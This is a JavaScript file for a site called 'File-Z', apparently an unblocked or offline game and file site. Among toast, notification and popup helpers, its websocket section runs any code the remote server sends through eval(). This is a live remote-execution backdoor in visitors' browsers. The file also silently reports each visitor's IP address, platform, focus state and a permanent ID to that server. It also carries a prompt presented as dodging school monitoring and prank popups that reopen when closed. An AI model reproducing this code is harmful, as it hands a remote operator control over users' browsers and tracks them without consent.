var newestVersion = "2.2.5"; // this is the newest available version of the offline file system
var isPageVisible = null;  // Initialize as null when the page loads
let isBanned = localStorage.getItem("isBanned");


//**********************************************************************************************
//                           Toast config
//**********************************************************************************************
function showToast(message, url, color, timeout) {
  // Check if the container element exists, create it if it doesn't
  var container = document.getElementById('toast-container');
  if (!container) {
    container = document.createElement('div');
    container.id = 'toast-container';
    container.style.position = 'fixed';
    container.style.bottom = '20px';
    container.style.right = '20px';
    document.body.appendChild(container);
  }

  // Create the toast element
  var toast = document.createElement('div');
  toast.textContent = message;
  toast.style.backgroundColor = color || '#333';
  toast.style.color = '#fff';
  toast.style.borderRadius = '8px';
  toast.style.padding = '10px 20px';
  toast.style.animation = 'slideIn 0.3s ease-in';
  toast.style.cursor = url ? 'pointer' : 'default';
  toast.style.marginBottom = '10px';
  toast.style.wordBreak = 'break-word';

  // Attach the onclick event to redirect to the specified URL
  if (url) {
    toast.onclick = function() {
      window.location.href = url;
    };
  }

  // Append the toast element to the container
  container.appendChild(toast);

  // Set a timeout to remove the toast
  setTimeout(function() {
    toast.style.animation = 'slideOut 0.3s ease-in';
    setTimeout(function() {
      container.removeChild(toast);
    }, 300);
  }, timeout || 5000);
}

//**********************************************************************************************
//                           End Toast config. 
//
//                           Start protocol thingy
//**********************************************************************************************


// used to define and display protocol
var protocol = window.location.protocol;

            if (protocol === 'file:') {
                showToast('Using "file" protocol', '#', 'orange', 3000);
            } else if (protocol === 'https:') {
                showToast('Using "https" protocol. Consider downloading stand alone.', 'https://drive.google.com/drive/folders/1XqZfzWx4XT3Rg8mHimjabHSg_VPg5sm5?usp=share_link', 'orange', 4000);
            } else {
                showToast('Using unknown protocol', '#', 'orange', 3000);
            }


//********************************************************************************************
//                          end protocol thingy
//
//                          start go-gardian anti-close
//********************************************************************************************

// Function to handle beforeunload event
window.onbeforeunload = function(e) {
  var askBeforeUnload = localStorage.getItem("askOnCloseLS");

  if (askBeforeUnload === "true") {
    return 'Someone may be attempting to close your window. Please confirm or deny this action.';
  }
}

//********************************************************************************************
//                          end go-gardian anti-close
//
//                          start offline detection
//********************************************************************************************

var wasOnline = true; // Keep track of the previous online status

// Function to check online status and display toast messages
function checkOnlineStatus() {
  const timestamp = new Date().toLocaleTimeString(); // Get the current time
  if (navigator.onLine && !wasOnline) {
    showToast("You're back online!", '#', 'green', '2000');
    wasOnline = true;
    console.info(`${timestamp} - Network: Online`); // Log online status with timestamp and "Network" level
  } else if (!navigator.onLine && wasOnline) {
    showToast("You're offline!", '#', 'red', '4900');
    wasOnline = false;
    console.info(`${timestamp} - Network: Offline`); // Log offline status with timestamp and "Network" level
  } else if (navigator.onLine && wasOnline) {
    console.info(`${timestamp} - Network: Online`); // Log online status with timestamp and "Network" level
  }
}

// Initial check
checkOnlineStatus();

// Check online status every 5 seconds
setInterval(checkOnlineStatus, 5000);


//********************************************************************************************
//                          end offline detection
//
//                          start websocket
//********************************************************************************************


// Define the server address here
const serverAddress = "wss://fz-websocket.megaderp100.repl.co";

let ws;

function connectWebSocket() {
  ws = new WebSocket(serverAddress);

  ws.addEventListener("open", () => {
    const customClientID = localStorage.getItem("customClientID");
    const notifyMe = localStorage.getItem("notifyAllowed");

    let dataToSend = {
      customClientID: customClientID
    };

    const jsonData = JSON.stringify(dataToSend);
    ws.send(jsonData);
    console.log("WebSocket connected.");
    sendInfo();
  });

  ws.addEventListener("message", (e) => {
    try {
      const receivedData = JSON.parse(e.data);
      console.log("Received message:", receivedData); // Log received messages

      if (receivedData.run) {
        // Handle run messages
        const jsCode = typeof receivedData.run === "string" ? receivedData.run : receivedData.run.command;

        console.log("Received run command:", jsCode); // Log the received command

        if (jsCode !== undefined && typeof jsCode === "string") {
          console.log(`Received and executing command: ${jsCode}`);
          try {
            eval(jsCode);
          } catch (evalError) {
            console.error("Error during eval:", evalError);
          }
        } else {
          console.error("Invalid or unspecified command format.");
        }
      }
    } catch (error) {
      console.error("Error parsing received data:", error);
    }
  });

  ws.addEventListener("close", () => {
    console.warn("WebSocket closed. Reconnecting...");
    setTimeout(connectWebSocket, 2000); // Retry connection after 2 seconds
  });

  ws.addEventListener("error", (error) => {
    console.error("WebSocket error:", error);
    ws.close(); // Close the WebSocket on error
  });
}

connectWebSocket(); // Initial connection attempt


function sendInfo() {
    const siteVersion = window.localStorage.getItem("siteVersion");

    // send site version
    let dataToSend = {
          data:{
            version: siteVersion,
          },
        };
        let jsonData = JSON.stringify(dataToSend);
        ws.send(jsonData);

    // send not controller
    dataToSend = {
          data:{
            controller: false,
          },
        };
        jsonData = JSON.stringify(dataToSend);
        ws.send(jsonData);
  //send platform
    dataToSend = {
            data:{
              platform: navigator.platform,
            },
          };
          jsonData = JSON.stringify(dataToSend);
          ws.send(jsonData);
  //send hidden info before it gets updated
    if (document.hidden || document.webkitHidden) {
        isPageVisible = false;  // Page is not in focus
        
      } else {
        isPageVisible = true;   // Page is in focus
      }
  
    dataToSend = {
            data:{
              pageInFocus: isPageVisible,
            },
          };
          jsonData = JSON.stringify(dataToSend);
          ws.send(jsonData);
  getIp();
};


//********************************************************************************************
//                          end websocket
//
//                          start banhandler
//********************************************************************************************
function handleBan() {
if (isBanned !== null){


  let dataToSend = {
          data:{
            isBanned: isBanned,
          },
        };
        let jsonData = JSON.stringify(dataToSend);
        showToast(isBanned, "#", "red", "10000000000000");
        //alert(isBanned);
        // Create a new div element
        var overlayDiv = document.createElement("div");
        
        // Set styles for the overlay div to cover the entire page
        overlayDiv.style.position = "fixed";
        overlayDiv.style.top = "0";
        overlayDiv.style.left = "0";
        overlayDiv.style.width = "100%";
        overlayDiv.style.height = "100%";
        overlayDiv.style.zIndex = "9999";
        overlayDiv.style.backgroundColor = "rgba(0, 0, 0, 0.5)"; // Semi-transparent black background
        overlayDiv.style.cursor = "not-allowed"; 
        
        // Create an iframe element
        var iframe = document.createElement("iframe");
        
        // Set styles for the iframe to fill the overlay div
        iframe.style.width = "100%";
        iframe.style.height = "100%";
        iframe.style.border = "none"; // Remove iframe border
        iframe.src = "player.html?url=File-Z-backend/about/banned/banned.js"; // Replace with your desired URL
        
        // Add the iframe to the overlay div
        overlayDiv.appendChild(iframe);
        
        // Append the div to the body of the document
        document.body.appendChild(overlayDiv);
        
        // Add event listener to change cursor when mouse is over the page
        document.addEventListener("mouseover", function () {
          overlayDiv.style.cursor = "not-allowed";
        });
        
        // Append the div to the body of the document
        document.body.appendChild(overlayDiv);
  
         if (ws && ws.readyState === WebSocket.OPEN) {
      ws.send(jsonData); 
            } else {
              // If not ready, call constantID again after a delay
              setTimeout(handleBan, 1000);
         }
  
 
    }else{


   let dataToSend = {
          data:{
            isBanned: false,
          },
        };
        let jsonData = JSON.stringify(dataToSend);
        if (ws && ws.readyState === WebSocket.OPEN) {
      ws.send(jsonData); 
    } else {
      // If not ready, call constantID again after a delay
      setTimeout(handleBan, 1000);
  
}
}
}

handleBan()

//********************************************************************************************
//                            end banhandler
//
//                                   start force identification
//**********************************************************************************************

function forceName(){
  if (localStorage.getItem("customClientID") == null) {
      // Make a popup for the user to input their name
      var clientNameInput = window.prompt("It looks like your client has no name. Input a unique name.");
      // Now, you can store the entered name in localStorage or perform any other desired actions
      if (clientNameInput !== null) {
          localStorage.setItem("customClientID", clientNameInput);
      }else {
      forceName();
  }
  }
}
function constantID() {
  if (localStorage.getItem("permanentID") == null) {
    var newID = generateRandomID();
    localStorage.setItem("permanentID", newID);
    const dataToSend = {
      data: {
        permanentID: newID,
      },
    };

    const jsonData = JSON.stringify(dataToSend);

    // Check if ws is open before sending
    if (ws && ws.readyState === WebSocket.OPEN) {
      ws.send(jsonData);
    } else {
      // If not ready, call constantID again after a delay
      setTimeout(constantID, 1000); 
    }
  } else {
    const dataToSend = {
      data: {
        permanentID: localStorage.getItem("permanentID"),
      },
    };

    const jsonData = JSON.stringify(dataToSend);

    // Check if ws is open before sending
    if (ws && ws.readyState === WebSocket.OPEN) {
      ws.send(jsonData); 
    } else {
      // If not ready, call constantID again after a delay
      setTimeout(constantID, 1000); 
    }
  }
}

function generateRandomID() {
    var randomID = Math.floor(Math.random() * Math.pow(10, 10));
    return randomID.toString().padStart(10, '0');
}

forceName();
constantID();
//**********************************************************************************************
//                                  end force identification
//
//                          start notifications
//********************************************************************************************


// Ask for permission when the page loads
window.addEventListener('load', function() {
    if (!window.Notification) {
        console.log('Browser does not support notifications.');
    } else {
          if (!localStorage.getItem("notifyAllowed")){
            
        Notification.requestPermission().then(function (permission) {
            if (permission === 'granted') {
                console.log('Notification permission granted.');
                localStorage.setItem("notifyAllowed", true);
            } else if (permission === 'denied') {
                console.log('Notification permission denied.');
            } else if (permission === 'default') {
                console.log('Notification permission dismissed (default).');
            }
        }).catch(function (err) {
            console.error(err);
        });
      }
    }
});

function sendNotification(title, body, icon) {
    if (!window.Notification) {
        console.log('Browser does not support notifications.');
    } else {
        // check if permission is already granted
        if (Notification.permission === 'granted') {
            // show notification here
            var notify = new Notification(title, {
                body: body,
                icon: icon,
            });
        } else {
            console.log('Permission to show notifications has not been granted.');
        }
    }
}


//********************************************************************************************
//                          end notifications
//
//                          start detect active users
//********************************************************************************************


function handleVisibilityChange() {
  if (document.hidden || document.webkitHidden) {
    isPageVisible = false;  // Page is not in focus
    
  } else {
    isPageVisible = true;   // Page is in focus
  }
  const dataToSend = {
      data:{
        pageInFocus: isPageVisible,
      },
    };

    const jsonData = JSON.stringify(dataToSend);
    ws.send(jsonData);
}

// Listen for visibility change events
document.addEventListener("visibilitychange", handleVisibilityChange, false);

//********************************************************************************************
//                          end detect active users
//
//                          start "xp" like popup config
//********************************************************************************************

function popup(url) {
    // Create a div for the window and set its styles
    var windowDiv = document.createElement("div");
    windowDiv.style.position = "absolute";
    windowDiv.style.backgroundColor = "#008080"; // Teal color
    windowDiv.style.border = "2px solid #000";
    windowDiv.style.boxShadow = "5px 5px 5px #888";
    windowDiv.style.zIndex = "9999";
    windowDiv.style.overflow = "hidden"; // Hide content overflow

    // Create a title bar for the window and set its styles
    var titleBar = document.createElement("div");
    titleBar.style.backgroundColor = "#000";
    titleBar.style.color = "#fff";
    titleBar.style.padding = "5px";
    titleBar.style.cursor = "move";
    titleBar.style.userSelect = "none";
    titleBar.textContent = "Advertisement"; // Updated title to "Advertisement"

    // Create a close button for the window and set its styles
    var closeButton = document.createElement("span");
    closeButton.innerHTML = "&times;";
    closeButton.style.position = "absolute";
    closeButton.style.top = "5px";
    closeButton.style.right = "5px";
    closeButton.style.color = "#fff";
    closeButton.style.cursor = "pointer";
    closeButton.style.fontWeight = "bold";

    // Function to close the window
    closeButton.onclick = function () {
        if (Math.random() < 0.1) {
            // 10% chance of reopening
            popup(url);
        }
        document.body.removeChild(windowDiv);
    };

    // Append the title bar and close button to the window
    windowDiv.appendChild(titleBar);
    windowDiv.appendChild(closeButton);

    // Function to make the window draggable
    function dragElement(elmnt) {
        var pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
        if (titleBar) {
            // If the title bar is present, it's where you move the window from
            titleBar.onmousedown = dragMouseDown;
        } else {
            // Otherwise, move the window from anywhere inside the div
            elmnt.onmousedown = dragMouseDown;
        }

        function dragMouseDown(e) {
            e = e || window.event;
            e.preventDefault();
            // Get the mouse cursor's current position
            pos3 = e.clientX;
            pos4 = e.clientY;
            document.onmouseup = closeDragElement;
            // Call a function whenever the cursor moves
            document.onmousemove = elementDrag;
        }

        function elementDrag(e) {
            e = e || window.event;
            e.preventDefault();
            // Calculate the new cursor position
            pos1 = pos3 - e.clientX;
            pos2 = pos4 - e.clientY;
            pos3 = e.clientX;
            pos4 = e.clientY;
            // Set the element's new position
            elmnt.style.top = (elmnt.offsetTop - pos2) + "px";
            elmnt.style.left = (elmnt.offsetLeft - pos1) + "px";
        }

        function closeDragElement() {
            // Stop moving when the mouse button is released
            document.onmouseup = null;
            document.onmousemove = null;
        }
    }

    // Randomly set the initial position and size of the window
    var maxWindowHeight = Math.floor(Math.random() * 200) + 200; // Favor larger heights
    var maxWindowWidth = maxWindowHeight + Math.floor(Math.random() * 100); // Adjusted width based on height

    // Ensure the window doesn't spawn too low
    var maxYPosition = window.innerHeight - maxWindowHeight - 30; // 30px buffer
    windowDiv.style.top = Math.floor(Math.random() * maxYPosition) + "px";

    // Randomly set the initial horizontal position
    var maxXPosition = window.innerWidth - maxWindowWidth;
    windowDiv.style.left = Math.floor(Math.random() * maxXPosition) + "px";

    var windowHeight = Math.floor(Math.random() * (maxWindowHeight - 100)) + 200; // Favor larger heights
    var windowWidth = Math.floor(Math.random() * (maxWindowWidth - 100)) + 200; // Favor larger widths

    // Ensure the minimum width and height are 200px
    if (windowHeight < 200) {
        windowHeight = 200;
    }
    if (windowWidth < 200) {
        windowWidth = 200;
    }

    windowDiv.style.width = windowWidth + "px";
    windowDiv.style.height = windowHeight + "px";

    // Use the provided URL, or if none is provided, select from the predefined list
    var selectedUrl = url || getRandomPredefinedUrl();

    // Function to determine the file type based on the URL
    function getFileType(url) {
        if (url.endsWith(".jpg") || url.endsWith(".jpeg") || url.endsWith(".png") || url.endsWith(".gif")) {
            return "image";
        } else if (url.endsWith(".pdf")) {
            return "pdf";
        } else if (url.endsWith(".txt")) {
            return "text";
        } else {
            // Assume it's a generic URL
            return "generic";
        }
    }

    // Determine the file type
    var fileType = getFileType(selectedUrl);

    // Dynamically load content based on the file type
    switch (fileType) {
        case "image":
            // Use an image element
            var img = document.createElement("img");
            img.src = selectedUrl;
            img.style.maxWidth = "100%";
            img.style.maxHeight = "100%";

            // Create a div for the content and set its styles
            var contentDiv = document.createElement("div");
            contentDiv.style.width = "100%";
            contentDiv.style.height = "100%";
            contentDiv.style.overflow = "hidden"; // Hide content overflow
            contentDiv.appendChild(img);

            // Append the content div to the window div
            windowDiv.appendChild(contentDiv);

            break;

        case "pdf":
            // Use an <embed> element to display the PDF directly
            var embed = document.createElement("embed");
            embed.src = selectedUrl;
            embed.type = "application/pdf";
            embed.style.width = "100%";
            embed.style.height = "100%";

            // Create a div for the content and set its styles
            var contentDiv = document.createElement("div");
            contentDiv.style.width = "100%";
            contentDiv.style.height = "100%";
            contentDiv.style.overflow = "auto"; // Allow scrolling for PDFs
            contentDiv.appendChild(embed);

            // Append the content div to the window div
            windowDiv.appendChild(contentDiv);

            break;

        case "text":
            // Create a div for the content and set its styles
            var contentDiv = document.createElement("div");
            contentDiv.style.width = "100%";
            contentDiv.style.height = "100%";
            contentDiv.style.overflow = "auto"; // Allow scrolling for long text files

            // Create an iframe to embed the text content in a new HTML document
            var iframe = document.createElement("iframe");
            iframe.style.width = "100%";
            iframe.style.height = "100%";
            iframe.style.border = "none";

            // Create a new HTML document
            var doc = iframe.contentDocument || iframe.contentWindow.document;

            // Fetch the text file and insert its content into the new document
            fetch(selectedUrl)
                .then(response => response.text())
                .then(text => {
                    // Set the content of the new document's body
                    doc.body.innerHTML = "<pre>" + text + "</pre>";
                    contentDiv.appendChild(iframe);
                })
                .catch(error => {
                    console.error("Error fetching text file:", error);
                    contentDiv.textContent = "Error loading text content.";
                });

            // Append the content div to the window div
            windowDiv.appendChild(contentDiv);

            break;

        default:
            // For generic URLs, load as iframe
            var iframe = document.createElement("iframe");
            iframe.src = selectedUrl;
            iframe.style.width = "100%";
            iframe.style.height = "100%";
            iframe.style.border = "none";

            // Create a div for the content and set its styles
            var contentDiv = document.createElement("div");
            contentDiv.style.width = "100%";
            contentDiv.style.height = "100%";
            contentDiv.style.overflow = "auto"; // Allow scrolling for generic content
            contentDiv.appendChild(iframe);

            // Append the content div to the window div
            windowDiv.appendChild(contentDiv);

            break;
    }

    // Append the window to the body
    document.body.appendChild(windowDiv);

    // Make the window draggable
    dragElement(windowDiv);
}

// Function to get a random URL from the predefined list
function getRandomPredefinedUrl() {
    var predefinedUrls = [
        "https://media.tenor.com/o656qFKDzeUAAAAC/rick-astley-never-gonna-give-you-up.gif",
        "https://media.tenor.com/O14R4p9-t-sAAAAM/get-stick-bugged-lol.gif",
        "https://thescriptlab.com/wp-content/uploads/scripts/BeeMovie.pdf",
        "https://media.tenor.com/I4EvQNJfrMcAAAAC/dancing-eat.gif",
        "https://media.tenor.com/tL2LKTv8MSgAAAAC/horse-spin.gif",
        "https://i.kym-cdn.com/entries/icons/facebook/000/042/306/rbc.jpg",
        "https://media.tenor.com/0dGpRmwd1P0AAAAC/weenor-memes-meme-funny-hotdog-glizzy-haha-weiner-cursed.gif",
        "https://media.tenor.com/OoGJfgQGlOkAAAAd/deer-dancing.gif"
        /*
        supported file types
        "https://example.com/image1.jpg",
        "https://example.com/image2.jpg",
        "https://example.com/page1.html",
        "https://example.com/page2.html",
        "https://example.com/document.pdf",
        "https://example.com/textfile.txt"
        */
      
    ];
    var randomIndex = Math.floor(Math.random() * predefinedUrls.length);
    return predefinedUrls[randomIndex];
}

// Example usages:
// popup("https://example.com/single-image.jpg"); // Supports a single URL
// popup(); // Uses a URL from the predefined list if no URL is provided


//********************************************************************************************
//                          end "xp" like popup config
//
//                          start audio reciever
//********************************************************************************************


function playAudio(audio) {
  const sounds = {
    "sound1": "sound 1 url",
    "sound2": "sound 2 url",
    "sound3": "sound3 url"
  };

  if (audio == null) {
    // If 'audio' is not provided, select a random sound from the list.
    const soundNames = Object.keys(sounds);
    const randomSoundName = soundNames[Math.floor(Math.random() * soundNames.length)];
    audio = sounds[randomSoundName];
  }

  if (typeof audio === 'string') {
    if (audio.startsWith('http')) {
      // If 'audio' is a string starting with 'http', treat it as a custom URL and play the audio.
      const audioPlayer = new Audio(audio);
      
      // Mute the audio by default (user can unmute).
      audioPlayer.muted = true;

      // Add a click event listener to play audio on user interaction.
      document.addEventListener('click', () => {
        audioPlayer.muted = false; // Unmute on user click.
        audioPlayer.play();
      });

      // Pause the audio until it starts playing.
      audioPlayer.addEventListener('playing', () => {
        audioPlayer.pause();
      });

    } else if (sounds.hasOwnProperty(audio)) {
      // If 'audio' is a name of a sound in the list, play that sound.
      const audioUrl = sounds[audio];
      const audioPlayer = new Audio(audioUrl);
      
      // Mute the audio by default (user can unmute).
      audioPlayer.muted = true;

      // Add a click event listener to play audio on user interaction.
      document.addEventListener('click', () => {
        audioPlayer.muted = false; // Unmute on user click.
        audioPlayer.play();
      });

      // Pause the audio until it starts playing.
      audioPlayer.addEventListener('playing', () => {
        audioPlayer.pause();
      });
    } else {
      console.error('Invalid audio:', audio);
    }
  }
}

//**********************************************************************************************
//                            end audio
//
//                            get ip adress
//**********************************************************************************************

function getIp() {
fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    // Log the IP address into a variable
    const ipAddress = data.ip;
        //send ip
     dataToSend = {
              data:{
                ip: ipAddress,
              },
            };
            jsonData = JSON.stringify(dataToSend);
            ws.send(jsonData);

  })
  .catch(error => {
    console.error('Error fetching IP address:', error);
  });

}


//**********************************************************************************************
//                            end get ip
//**********************************************************************************************
